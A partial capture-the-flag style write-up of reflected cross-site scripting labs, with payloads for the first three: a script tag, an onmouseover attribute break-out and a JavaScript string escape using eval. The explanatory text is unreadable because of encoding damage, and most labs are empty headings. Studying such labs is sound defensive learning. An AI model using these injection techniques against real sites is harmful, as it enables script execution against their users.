# Reflected xss

## Table of contents:
* [Lab 1: Reflected XSS into HTML context with nothing encoded](#lab-1-reflected-xss-into-html-context-with-nothing-encoded)
* [Lab 2: Reflected XSS into attribute with angle brackets HTML-encoded](#lab-2-reflected-xss-into-attribute-with-angle-brackets-html-encoded)
* [Lab 3: Reflected XSS into a JavaScript string with angle brackets HTML encoded](#lab-3-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded)
* [Lab 4: Reflected DOM XSS](#lab-4-reflected-dom-xss)
* [Lab 5: Reflected XSS into HTML context with most tags and attributes blocked](#lab-5-reflected-xss-into-html-context-with-most-tags-and-attributes-blocked)
* [Lab 6: Reflected XSS into HTML context with all tags blocked except custom ones](#lab-6-reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones)
* [Lab 7: Reflected XSS with some SVG markup allowed](#lab-7-reflected-xss-with-some-svg-markup-allowed)
* [Lab 8: Reflected XSS in canonical link tag](#lab-8-reflected-xss-in-canonical-link-tag)
* [Lab 9: Reflected XSS into a JavaScript string with single quote and backslash escaped](#lab-9-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped)
* [Lab 10: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](#lab-10-reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped)
* [Lab 11: Reflected XSS with event handlers and href attributes blocked](#lab-11-reflected-xss-with-event-handlers-and-href-attributes-blocked)
* [Lab 12: Reflected XSS in a JavaScript URL with some characters blocked](#lab-12-reflected-xss-in-a-javascript-url-with-some-characters-blocked)
* [Lab 13: Reflected XSS with AngularJS sandbox escape without strings](#lab-13-reflected-xss-with-angularjs-sandbox-escape-without-strings)
* [Lab 14: Reflected XSS with AngularJS sandbox escape and CSP](#lab-14-reflected-xss-with-angularjs-sandbox-escape-and-csp)
* [Lab 15: Reflected XSS protected by very strict CSP, with dangling markup attack](#lab-15-reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack)
* [Lab 16: Reflected XSS protected by CSP, with CSP bypass](#lab-16-reflected-xss-protected-by-csp-with-csp-bypass)

## Lab 1: Reflected XSS into HTML context with nothing encoded

```
This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function. 
```
????y l?? d???ng reflected xss c?? b???n. D??ng payload: 

> <script>alert('xss')</script>


![xss1](https://github.com/manhhuy2002/hello-world/blob/main/xss/1.jpg)

## Lab 2: Reflected XSS into attribute with angle brackets HTML-encoded

```
This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function. 

```
Nh?? ????? b??i, b??i lab ???? d??ng html-encoded, th??? truy???n <script>alert(1)</script> v??o th?? th???y:

![](https://github.com/manhhuy2002/hello-world/blob/main/xss/2.jpg)

Nh??ng c?? v??? kh m?? h??a d???u ", v?? v???y ta c?? th??? khai th??c nh?? sau:
Truy???n v??o ", ????? ????ng gi?? tr??? value l???i, ta kh th??? ????ng th??? input ???????c do ???? b??? m?? h??a n??n ?????n ????y c???n l??m cho k??ch ho???t function alert b??n trong th??? input lu??n b???ng c??ch truy???n v??o thu???c t??nh onmouseover v???i gi?? tr??? l?? function alert:

```
" onmouseover = "alert(1)

```

![](https://github.com/manhhuy2002/hello-world/blob/main/xss/3.jpg)

## Lab 3: Reflected XSS into a JavaScript string with angle brackets HTML encoded

```
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 
```
??? b??i lab th??? 3, th??? truy???n v??o thanh t??m ki???m <script>alert(1)</script> r???i ki???m tra b???ng burpsuite, th?? th???y c??? truy???n v??o <script> hay th??? <> th?? s??? b??? encode:
 
![](https://github.com/manhhuy2002/hello-world/blob/main/xss/4.jpg)
 
 Do gi?? tr??? c???a Searchterms ??ang kh ???????c b???o v??? ????ng c??ch n??n  m??nh khai th??c b???ng c??ch t???n d???ng h??m ????ng gi?? tr??? searchterms v?? th???c hi???n h??m eval:

```
    <script>
      var searchTerms = ''; eval(alert(1))//';
      document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
  </script>
  
```
M??nh truy???n v??o h??m ';eval(alert(1))// , ????? ????ng gi?? tr??? var searchTerms = ''; ?????ng th???i th???c hi???n h??m eval(alert(1)), v?? ???????c k???t qu???:
  
![](https://github.com/manhhuy2002/hello-world/blob/main/xss/5.jpg)

## Lab 4: Reflected DOM XSS

 ```
  This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that calls the alert() function. 
```

  
  
## Lab 5: Reflected XSS into HTML context with most tags and attributes blocked
## Lab 6: Reflected XSS into HTML context with all tags blocked except custom ones
## Lab 7: Reflected XSS with some SVG markup allowed
## Lab 8: Reflected XSS in canonical link tag
## Lab 9: Reflected XSS into a JavaScript string with single quote and backslash escaped
## Lab 10: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
## Lab 11:Reflected XSS with event handlers and href attributes blocked
## Lab 12: Reflected XSS in a JavaScript URL with some characters blocked
## Lab 13: Reflected XSS with AngularJS sandbox escape without strings
## Lab 14: Reflected XSS with AngularJS sandbox escape and CSP
## Lab 15: Reflected XSS protected by very strict CSP, with dangling markup attack
## Lab 16: Reflected XSS protected by CSP, with CSP bypass
